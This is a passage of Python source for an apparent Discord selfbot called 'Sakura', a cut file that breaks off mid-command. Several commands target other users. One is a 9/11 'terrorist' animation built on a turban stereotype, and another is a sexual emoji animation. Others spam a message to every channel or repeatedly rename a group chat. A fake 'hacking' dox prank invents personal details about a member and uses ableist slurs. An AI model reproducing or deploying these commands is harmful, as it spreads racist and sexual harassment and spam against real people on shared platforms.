    unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"


@Sakura.command(aliases=['stopcopycatuser', 'stopcopyuser', 'stopcopy'])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Sakura.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Sakura.copycat))
    Sakura.copycat = None


@Sakura.command(aliases=['copycatuser', 'copyuser'])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Sakura.copycat = user
    await ctx.send("Now copying " + str(Sakura.copycat))


@Sakura.command(aliases=['9/11', '911', 'terrorist'])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')


@Sakura.command(aliases=['jerkoff', 'ejaculate', 'orgasm'])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')





@Sakura.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass


@Sakura.command(aliases=['spamchangegcname', 'changegcname'])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Sakura ontop!"
        name = "Sakura 95 was here"
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)











@Sakura.command()
async def tweet2(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Sakura_tweet.png"))
            except:
                await ctx.send(res['message'])


@Sakura.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_magik.png"))
        except:
            await ctx.send(res['message'])





@Sakura.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_fry.png"))
        except:
            await ctx.send(res['message'])


@Sakura.command()
async def blur(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/blur?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_blur.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command(aliases=["pixel"])
async def pixelate(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_pixelate.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_pixelate.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command()
async def supreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_supreme.png"))
    except:
        await ctx.send(endpoint)


@Sakura.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Sakura.command(aliases=["facts"])
async def fax(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_facts.png"))
    except:
        await ctx.send(endpoint)


@Sakura.command(aliases=['blurp'])
async def blurpify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_blurpify.png"))
        except:
            await ctx.send(res['message'])


@Sakura.command()
async def invert(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/invert?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_invert.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command()
async def gay(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/gay?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_gay.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command()
async def communist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/communist?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_commmunist.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_invert.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command()
async def snow(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/snow?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_snow.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_snow.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command(aliases=['jpeg'])
async def jpegify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_jpeg_convrted.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Sakura_jpeg_convrted.png"))
        except:
            await ctx.send(endpoint)


@Sakura.command(aliases=['pornhublogo', 'phlogo'])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
        "{text-2}", word2)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@Sakura.command(aliases=['pornhubcomment', 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])


@Sakura.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@Sakura.command()
async def hack2(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
